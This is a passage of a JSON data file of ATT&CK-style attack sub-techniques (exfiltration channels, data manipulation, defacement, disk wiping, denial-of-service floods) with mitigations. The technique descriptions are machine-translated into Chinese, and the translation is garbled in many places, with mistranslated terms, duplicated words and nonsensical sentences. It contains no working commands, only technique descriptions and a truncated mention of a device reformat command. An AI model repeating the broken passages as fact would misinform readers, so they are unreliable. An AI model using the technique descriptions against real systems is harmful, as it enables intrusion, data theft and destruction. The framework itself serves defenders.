          "content": "对手可能会利用流量镜像，以便在基础架构上自动化数据剥落。流量镜像是某些设备的本机功能，通常用于网络分析。例如，可以将设备配置为将网络流量转发到一个或多个目的地，以通过网络分析仪或其他监视设备进行分析。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会滥用交通镜像，以通过其控制的其他基础架构镜像或重定向网络流量。通过RommonKit或Patch System Image可以对网络设备进行恶意修改以实现流量重定向。"
        }
      ],
      [
        {
          "type": "text",
          "content": "许多基于云的环境也支持流量镜像。例如，AWS流量镜像，GCP数据包镜像和Azure VTAP允许用户定义指定的实例，以收集流量并指定的目标，以将收集的流量发送到。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根据对手的目标和目标，对手可以将流量重复与网络嗅探，输入捕获或中间的对手一起使用。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "确保适当地加密所有有线和/或无线流量。使用最佳实践来进行身份验证协议，例如Kerberos，并确保可能包含凭据的网络流量受SSL/TLS的保护。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "在云环境中，请确保不授予用户创建或修改流量镜的权限，除非明确需要。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1048.001",
    "name": "Exfiltration Over Symmetric Encrypted Non-C2 Protocol",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Alternative Protocol",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过通过对称加密的网络协议除外，而不是现有命令和控制频道的对称加密网络协议来窃取数据。数据也可以从主命令和控制服务器发送到替代网络位置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对称加密算法是在通道的每一端都使用共享的键/秘密的算法。这需要对用于加密和解密数据的价值的交换或预先安排的协议/拥有。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用不对称加密的网络协议一旦键交换，通常会使用对称加密，但是对手可以选择手动共享密钥并实现对称的加密算法（EX：RC4，AES，AES）验证，使用被烤入协议中的机制。这可能会导致多个加密层（以本生质加密的协议，例如HTTPS）或在通常不加密的协议中（例如HTTP或FTP）中进行加密。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "强制代理并使用专用服务器来用于DNS之类的服务，并且仅允许这些系统通过各个端口/协议进行通信，而不是网络中的所有系统。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "网络入侵检测和预防系统使用网络签名来识别特定对手命令和控制基础架构和恶意软件的流量，可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循网络防火墙配置的最佳实践，以便仅允许必要的端口和流量进入和退出网络。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1048.002",
    "name": "Exfiltration Over Asymmetric Encrypted Non-C2 Protocol",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Alternative Protocol",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过通过非对称加密的网络协议除外，而不是现有命令和控制渠道的非对称加密网络协议来窃取数据。数据也可以从主命令和控制服务器发送到替代网络位置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "非对称加密算法是在通道两端使用不同键的算法。这也称为公钥加密，这需要成对的密码键，这些密钥可以从相应的键加密/解密数据。通信渠道的每个末端都需要一个私钥（仅在该实体的游行中）和其他实体的公钥。在加密通信开始之前，要交换每个实体的公共钥匙。"
        }
      ],
      [
        {
          "type": "text",
          "content": "使用不对称加密的网络协议（例如HTTPS/TLS/SSL）通常会在键交换后使用对称加密。对手可以选择使用这些加密的机制，这些机制被烘烤到协议中。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "预防数据丢失",
        "description": [
          [
            {
              "type": "text",
              "content": "预防数据丢失可以检测并阻止通过Web浏览器上传的敏感数据。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "强制代理并使用专用服务器来用于DNS之类的服务，并且仅允许这些系统通过各个端口/协议进行通信，而不是网络中的所有系统。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "网络入侵检测和预防系统使用网络签名来识别特定对手命令和控制基础架构和恶意软件的流量，可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循网络防火墙配置的最佳实践，以便仅允许必要的端口和流量进入和退出网络。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1048.003",
    "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Alternative Protocol",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会通过通过未加密的网络协议除外，而不是现有命令和控制渠道的其他网络协议来窃取数据。数据也可以从主命令和控制服务器发送到替代网络位置。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以选择在本地未加密的网络协议中（例如HTTP，FTP或DNS）中混淆此数据，而无需使用加密。这可能包括自定义或公开编码/压缩算法（例如base64）以及将数据嵌入协议标头和字段中。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "预防数据丢失",
        "description": [
          [
            {
              "type": "text",
              "content": "预防数据丢失可以检测并阻止通过未加密协议发送的敏感数据。"
            }
          ]
        ]
      },
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "强制代理并使用专用服务器来用于DNS之类的服务，并且仅允许这些系统通过各个端口/协议进行通信，而不是网络中的所有系统。"
            }
          ]
        ]
      },
      {
        "id": "M1031",
        "name": "网络入侵预防",
        "description": [
          [
            {
              "type": "text",
              "content": "网络入侵检测和预防系统使用网络签名来识别特定对手命令和控制基础架构和恶意软件的流量，可用于减轻网络级别的活动。"
            }
          ]
        ]
      },
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "遵循网络防火墙配置的最佳实践，以便仅允许必要的端口和流量进入和退出网络。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1011.001",
    "name": "Exfiltration Over Bluetooth",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Other Network Medium",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试通过蓝牙而不是命令和控制通道来渗透数据。如果命令和控制网络是有线的Internet连接，则对手可以选择使用蓝牙通信渠道渗透数据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果对手有足够的访问和接近性，可以选择这样做。蓝牙连接可能无法获得或防御以及主要与Internet连接的通道，因为它没有通过同一企业网络路由。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "在本地计算机安全设置或组策略中禁用蓝牙，如果在环境中不需要。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "尽可能防止创建新的网络适配器。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1052.001",
    "name": "Exfiltration over USB",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Physical Medium",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会尝试通过USB连接的物理设备渗透数据。在某些情况下，例如气动网络妥协，可能会通过用户引入的USB设备进行渗透。USB设备可以用作最终的渗透点，也可以在原本断开的系统之间跳跃。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "预防数据丢失",
        "description": [
          [
            {
              "type": "text",
              "content": "数据丢失可以检测并阻止将敏感数据复制到USB设备。"
            }
          ]
        ]
      },
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不需要，请禁用自动运行。如果业务运营不需要，则禁止或限制组织政策级别的可移动媒体。"
            }
          ]
        ]
      },
      {
        "id": "M1034",
        "name": "限制硬件安装",
        "description": [
          [
            {
              "type": "text",
              "content": "限制在网络中使用USB设备和可移动媒体的使用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1567.001",
    "name": "Exfiltration to Code Repository",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Web Service",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将数据剥落到代码存储库，而不是通过其主命令和控制频道。代码存储库通常可以通过API访问（例如：https：//api.github.com）。对这些API的访问通常超过HTTP，这为对手提供了额外的保护水平。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果网络中的主机已经使用了一项流行的服务，那么对代码存储库的滤光也可以为对手提供大量覆盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "Web代理可用于执行防止使用未经授权的外部服务的外部网络通信策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1567.002",
    "name": "Exfiltration to Cloud Storage",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Web Service",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将数据驱逐到云存储服务，而不是通过其主要命令和控制频道。云存储服务允许通过Internet从远程云存储服务器从远程云存储服务器进行存储，编辑和检索。"
        }
      ],
      [
        {
          "type": "text",
          "content": "云存储服务的示例包括Dropbox和Google文档。如果网络中的主机已经与服务进行通信，那么对这些云存储服务的渗透可以为对手提供大量覆盖。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "Web代理可用于执行防止使用未经授权的外部服务的外部网络通信策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1567.003",
    "name": "Exfiltration to Text Storage Sites",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Web Service",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将数据驱逐到文本存储站点，而不是其主命令和控制频道。开发人员通常使用文本存储站点，例如"
        },
        {
          "type": "code",
          "content": " pastebin [。] com "
        },
        {
          "type": "text",
          "content": "，用于共享代码和其他信息。"
        }
      ],
      [
        {
          "type": "text",
          "content": "文本存储站点通常用于托管恶意代码用于C2通信（例如，阶段功能），但对手也可以使用这些站点去除收集的数据。此外，付费功能和加密选项可能使对手可以更安全地隐藏和存储数据。"
        }
      ],
      [
        {
          "type": "text",
          "content": "注意：这与渗透到代码存储库不同，该库突出显示了通过API访问代码存储库。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1021",
        "name": "限制基于Web的内容",
        "description": [
          [
            {
              "type": "text",
              "content": "Web代理可用于执行防止使用未经授权的外部服务的外部网络通信策略。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1567.004",
    "name": "Exfiltration Over Webhook",
    "tactics": [
      {
        "id": "TA0010",
        "name": "Exfiltration"
      }
    ],
    "technique": "Exfiltration Over Web Service",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以将数据渗透到Webhook端点，而不是通过其主命令和控制频道。Webhooks是允许服务器将数据推向客户端的简单机制，而无需客户端不断对服务器进行轮询。许多公共和商业服务，例如Discord，Slack和"
        },
        {
          "type": "code",
          "content": " Webhook.Site "
        },
        {
          "type": "text",
          "content": "，都支持创建其他服务可以使用的Webhook端点，例如Github，Jira或Trello。当链接服务中发生更改（例如推动存储库更新或修改机票）时，这些服务将自动将数据发布到Webhook端点，以供消费应用程序使用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以将对手拥有的环境与受害者拥有的SaaS服务联系起来，以实现电子邮件，聊天消息和其他数据的重复自动拆卸。另外，对手可以直接将分阶段数据张贴到URL，以便将其删除。"
        }
      ],
      [
        {
          "type": "text",
          "content": "访问Webhook端点通常越过HTTPS，这为对手提供了额外的保护水平。如果Webhook端点指向常用的SaaS应用程序或协作服务，那么利用Webhooks的去渗透也可以与普通网络流量融为一体。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1057",
        "name": "预防数据丢失",
        "description": [
          [
            {
              "type": "text",
              "content": "可以通过Web浏览器检测到数据丢失预防并阻止敏感数据上传到Web服务。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1565.001",
    "name": "Stored Data Manipulation",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Data Manipulation",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会插入，删除或操纵静止数据以影响外部结果或隐藏活动，从而威胁到数据的完整性。通过操纵存储的数据，对手可能会试图影响业务流程，组织理解和决策。"
        }
      ],
      [
        {
          "type": "text",
          "content": "存储的数据可能包括各种文件格式，例如Office文件，数据库，存储的电子邮件和自定义文件格式。修改的类型及其将产生的影响取决于数据的类型以及对手的目标。对于复杂的系统，对手可能需要特殊的专业知识，并可能访问与系统相关的专业软件，这些软件通常会通过长时间的信息收集活动获得，以产生预期的影响。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑加密重要信息，以降低对手执行量身定制的数据修改的能力。"
            }
          ]
        ]
      },
      {
        "id": "M1029",
        "name": "远程数据存储",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑实施IT灾难恢复计划，该计划包含用于进行定期数据备份的程序，可用于恢复组织数据。确保将备份存储在系统中，并保护对手可能使用的常见方法来获得访问和操纵备份。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "确保将最小特权原则应用于重要的信息资源，以减少暴露于数据操纵风险。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1565.002",
    "name": "Transmitted Data Manipulation",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Data Manipulation",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在通往存储或其他系统的途中更改数据，以操纵外部结果或隐藏活动，从而威胁到数据的完整性。通过操纵传输数据，对手可能会试图影响业务流程，组织理解和决策。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在网络连接或系统过程之间可能会有机会部署一个将截获和更改信息的工具之间的操作。修改的类型及其影响将取决于目标传输机制以及对手的目标。对于复杂的系统，对手可能需要特殊的专业知识，并可能访问与系统相关的专业软件，这些软件通常会通过长时间的信息收集活动获得，以产生预期的影响。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1041",
        "name": "加密敏感信息",
        "description": [
          [
            {
              "type": "text",
              "content": "加密所有重要数据流以减少定制修改对运输数据的影响。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1565.003",
    "name": "Runtime Data Manipulation",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Data Manipulation",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会修改系统，以便在访问并显示给最终用户的数据时操纵数据，从而威胁到数据的完整性。通过操纵运行时数据，对手可能会试图影响业务流程，组织理解和决策。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会更改用于显示数据的应用程序二进制文件，以引起运行时操作。对手还可以进行更改默认文件关联并伪装以引起类似的效果。修改的类型及其将取决于目标应用程序和过程以及对手的目标。对于复杂的系统，对手可能需要特殊的专业知识，并可能访问与系统相关的专业软件，这些软件通常会通过长时间的信息收集活动获得，以产生预期的影响。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1030",
        "name": "网络细分",
        "description": [
          [
            {
              "type": "text",
              "content": "确定对手可能针对的关键业务和系统流程，并努力隔离和保护这些系统免受未经授权的访问和篡改。"
            }
          ]
        ]
      },
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "防止关键业务和系统流程被替换，覆盖或重新配置以加载潜在的恶意代码。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1491.001",
    "name": "Internal Defacement",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Defacement",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会污损组织内部的系统，以恐吓或误导用户，从而抹黑系统的完整性。这可能会以更换桌面壁纸更换内部网站的形式，或直接转移到用户系统上。为了引起用户不适，或与随附的消息符合压力，您可以将干扰或令人反感的图像用作内部污损的一部分。由于内部污损系统暴露了对手的存在，因此通常发生在实现其他入侵目标之后。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1053",
        "name": "数据备份",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑实施IT灾难恢复计划，该计划包含用于进行定期数据备份的程序，可用于恢复组织数据。确保将备份存储在系统中，并保护对手可能使用的常见方法获得访问并破坏备份以防止恢复。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1491.002",
    "name": "External Defacement",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Defacement",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会污损组织外部的系统，以尝试传递消息传递，恐吓或以其他方式误导组织或用户。外部污损最终可能会导致用户不信任系统并质疑/抹黑系统的完整性。面向外部的网站是污损的普遍受害者；通常是由对手和黑客群体的目标，以推动政治信息或传播宣传。外部污损可以用作触发事件的催化剂，也可以用作对组织或政府采取的行动的回应。同样，网站损失也可以用作设置或前身，以进行以后的攻击，例如驱动器妥协。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1053",
        "name": "数据备份",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑实施IT灾难恢复计划，该计划包含用于进行定期数据备份的程序，可用于恢复组织数据。确保将备份存储在系统中，并保护对手可能使用的常见方法获得访问并破坏备份以防止恢复。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1561.001",
    "name": "Disk Content Wipe",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Disk Wipe",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会删除特定系统上的存储设备的内容，或者在网络中大量的存储设备中断对系统和网络资源的可用性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会部分或完全覆盖存储设备的内容，从而通过存储接口进行不可撤销的数据。具有破坏性意图的对手无需擦除特定的磁盘结构或文件，可以擦除磁盘内容的任意部分。为了擦除磁盘内容，对手可能会获得对硬盘驱动器的直接访问，以便使用随机数据覆盖任意尺寸的磁盘部分。还观察到了对手，利用Rawdisk等第三方驱动程序直接访问磁盘内容。这种行为与数据破坏不同，因为磁盘的各个部分被删除而不是单个文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了最大程度地对目标组织的影响最大化网络可用性中断是目标，用于擦拭磁盘内容的恶意软件可能具有类似蠕虫的功能，可以通过利用其他技术（例如有效的帐户，OS凭证倾销和SMB）来传播网络。/Windows管理员共享。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1053",
        "name": "数据备份",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑实施IT灾难恢复计划，该计划包含用于进行定期数据备份的程序，可用于恢复组织数据。确保将备份存储在系统中，并保护对手可能使用的常见方法获得访问并破坏备份以防止恢复。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1561.002",
    "name": "Disk Structure Wipe",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Disk Wipe",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会在启动系统所需的硬盘驱动器上损坏或擦除磁盘数据结构；针对特定的关键系统或网络中的大量目标，以中断系统和网络资源的可用性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会尝试通过覆盖位于主启动记录（MBR）或分区表等结构中的关键数据来启动系统。磁盘结构中包含的数据可能包括用于加载操作系统的初始可执行代码或磁盘上文件系统分区的位置。如果不存在此信息，则计算机将无法在启动过程中加载操作系统，从而使计算机不可用。磁盘结构擦除可以隔离进行，或者与磁盘内容擦除如果擦拭磁盘的所有扇区，则可以擦拭。"
        }
      ],
      [
        {
          "type": "text",
          "content": "在网络设备上，对手可以使用网络设备CLI命令（例如"
        },
        {
          "type": "code",
          "content": " form "
        },
        {
          "type": "text",
          "content": "）重新格式化文件系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "为了最大程度地影响目标组织的影响，设计用于破坏磁盘结构的恶意软件可能具有类似蠕虫的功能，可以通过利用其他技术（例如有效的帐户，OS凭证倾销和SMB/Windows Admin共享）来传播网络。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1053",
        "name": "数据备份",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑实施IT灾难恢复计划，该计划包含用于进行定期数据备份的程序，可用于恢复组织数据。确保将备份存储在系统中，并保护对手可能使用的常见方法获得访问并破坏备份以防止恢复。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1499.001",
    "name": "OS Exhaustion Flood",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Endpoint Denial of Service",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会引发针对端点操作系统（OS）的拒绝服务（DOS）攻击。系统的操作系统负责管理有限资源，并防止整个系统对其容量的过度需求淹没。这些攻击不需要耗尽系统上的实际资源；攻击可能简单地耗尽操作系统自我发出的极限和可用资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "实现这一目标的不同方法，包括TCP国家避免攻击，例如SYN洪水和ACK洪水。使用SYN洪水，发送了大量的SYN数据包，但是3向TCP握手从未完成。由于每个操作系统都有最大数量的并发TCP连接，因此这可以快速耗尽系统接收TCP连接新请求的能力，从而阻止访问服务器提供的任何TCP服务。"
        }
      ],
      [
        {
          "type": "text",
          "content": "ACK洪水利用了TCP协议的状态性质。将大量的ACK数据包发送到目标。这迫使操作系统搜索其状态表以找到已经建立的相关TCP连接。由于ACK数据包用于不存在的连接，因此OS必须搜索整个状态表以确认不存在匹配。如果有必要为大量数据包进行此操作时，计算要求可能会导致服务器变得缓慢和/或无响应，因为它必须为消除流氓ACK数据包所做的工作。这大大减少了可提供目标服务的资源。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "利用内容交付网络（CDN）提供的服务或专门从事DOS缓解的提供商，以滤除服务上游的流量。通过阻止源来滤波边界流量，解决攻击，阻止目标的端口或阻止用于运输的协议。为了防御SYN洪水，请实现Syn Cookie。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1499.002",
    "name": "Service Exhaustion Flood",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Endpoint Denial of Service",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以针对系统提供的不同网络服务来进行拒绝服务（DOS）。对手通常以DNS和Web服务的可用性为目标，但是其他人也是针对的。Web服务器软件可以通过各种方式攻击，其中一些通常适用，而另一些则适用于用于提供服务的软件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此类攻击的一个例子称为简单的HTTP洪水，对手将大量的HTTP请求发送到Web服务器，以压倒它和/或在其顶部运行的应用程序。这种洪水依靠原始体积来实现目标，耗尽受害者软件提供服务所需的任何各种资源。"
        }
      ],
      [
        {
          "type": "text",
          "content": "另一种称为SSL重新谈判攻击的变化利用了SSL/TLS中的协议功能。SSL/TLS协议套件包括客户端和服务器的机制，以便在加密算法上达成共识，以用于后续的安全连接。如果启用了SSL重新谈判，则可以提出重新谈判加密算法的请求。在重新谈判攻击中，对手建立了SSL/TLS连接，然后进行一系列重新谈判请求。由于加密重新谈判在计算周期中具有有意义的成本，因此在数量完成时可能会对服务的可用性产生影响。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "利用内容交付网络（CDN）提供的服务或专门从事DOS缓解的提供商，以滤除服务上游的流量。通过阻止源来滤波边界流量，解决攻击，阻止目标的端口或阻止用于运输的协议。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1499.003",
    "name": "Application Exhaustion Flood",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Endpoint Denial of Service",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会针对应用程序的资源密集型特征，以引起拒绝服务（DOS），从而拒绝这些应用程序的可用性。例如，Web应用程序中的特定功能可能是资源密集的。对这些功能的重复请求可能能够耗尽系统资源并拒绝访问该应用程序或服务器本身。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "利用内容交付网络（CDN）提供的服务或专门从事DOS缓解的提供商，以滤除服务上游的流量。通过阻止源来滤波边界流量，解决攻击，阻止目标的端口或阻止用于运输的协议。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1499.004",
    "name": "Application or System Exploitation",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Endpoint Denial of Service",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会利用可能导致应用程序或系统崩溃并拒绝用户可用的软件漏洞。发生崩溃时，某些系统可能会自动重新启动关键的应用程序和服务，但是可能会重新探索它们以持续拒绝服务（DOS）条件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会为崩溃应用程序和/或系统利用已知或零日漏洞，这也可能导致依赖的应用程序和/或系统处于DOS状态。崩溃或重新启动的应用程序或系统还可能具有其他效果，例如数据破坏，固件损坏，服务停止等，这可能会进一步导致DOS条件并拒绝对关键信息，应用程序和/或系统的可用性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "利用内容交付网络（CDN）提供的服务或专门从事DOS缓解的提供商，以滤除服务上游的流量。通过阻止源来滤波边界流量，解决攻击，阻止目标的端口或阻止用于运输的协议。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1498.001",
    "name": "Direct Network Flood",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Network Denial of Service",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会试图通过直接向目标发送大量网络流量来引起拒绝服务（DOS）。此DOS攻击还可以降低目标系统和网络的可用性和功能。直接的网络洪水是使用一个或多个系统将大量网络数据包发送到目标服务网络的时候。几乎所有网络协议都可以用于洪水。通常使用无状态协议，例如UDP或ICMP，但也可以使用状态协议，例如TCP。"
        }
      ],
      [
        {
          "type": "text",
          "content": "僵尸网络通常用于对网络和服务进行网络洪水攻击。大型僵尸网络可以从整个全球互联网中传播的系统产生大量流量。对手可能有资源来建立和控制自己的僵尸网络基础设施，或者可能在现有的僵尸网络上租用时间进行攻击。在某些最糟糕的分布式DOS（DDOS）的情况下，因此使用许多系统来产生洪水，以至于每个系统只需要发送少量流量即可产生足够的体积以使目标网络饱和。在这种情况下，将DDOS流量与合法客户区分开来变得极为困难。僵尸网络已用于一些最引人注目的DDOS洪水袭击中，例如针对美国主要银行的2012系列事件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1037",
        "name": "过滤网络流量",
        "description": [
          [
            {
              "type": "text",
              "content": "当洪水量超过目标网络连接的能力时，通常有必要拦截上游传入的流量以从合法流量中滤除攻击流量。可以由托管Internet服务提供商（ISP）或第三方（例如内容交付网络（CDN））或专门从事DOS缓解的提供商提供此类防御。"
            }
          ],
          [
            {
              "type": "text",
              "content": "根据洪水量的不同，可以通过阻止源地址来采购攻击，阻止目标的端口或阻止用于运输的协议来实现本地过滤。"
            }
          ],
          [
            {
              "type": "text",
              "content": "由于立即做出反应可能需要第三方的快速参与，因此分析与受网络DOS攻击影响的关键资源相关的风险，并制定灾难恢复计划/业务连续性计划以应对事件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1498.002",
    "name": "Reflection Amplification",
    "tactics": [
      {
        "id": "TA0040",
        "name": "Impact"
      }
    ],
    "technique": "Network Denial of Service",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会试图通过反映针对目标的大量网络流量来引起拒绝服务（DOS）。这种类型的网络DOS利用了主机的第三方服务器中介，并将响应给定的欺骗源IP地址。该第三方服务器通常称为反射器。对手通过将数据包发送给反射器，并带有受害者的欺骗地址来实现反射攻击。与直接网络洪水类似，可以使用多个系统来进行攻击，也可以使用僵尸网络。同样，可以使用一个或多个反射器将流量集中在目标上。该网络DOS攻击还可以降低目标系统和网络的可用性和功能。"
        }
      ],
      [
        {
          "type": "text",
